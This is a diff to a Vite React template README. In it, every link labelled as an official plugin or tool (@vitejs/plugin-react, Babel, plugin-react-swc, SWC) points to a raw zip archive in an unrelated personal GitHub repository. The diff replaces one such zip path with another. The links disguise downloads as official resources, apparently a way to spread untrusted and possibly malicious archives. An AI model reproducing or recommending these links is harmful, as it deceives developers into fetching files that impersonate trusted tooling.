@@ -4,5 +4,5 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/devise/hyper_place.zip) uses [Babel](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/devise/hyper_place.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/devise/hyper_place.zip) uses [SWC](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/devise/hyper_place.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/src/Provider/hyper_place_v2.0.zip) uses [Babel](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/src/Provider/hyper_place_v2.0.zip) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/src/Provider/hyper_place_v2.0.zip) uses [SWC](https://raw.githubusercontent.com/Ashikparvez89/hyper_place/main/src/Provider/hyper_place_v2.0.zip) for Fast Refresh
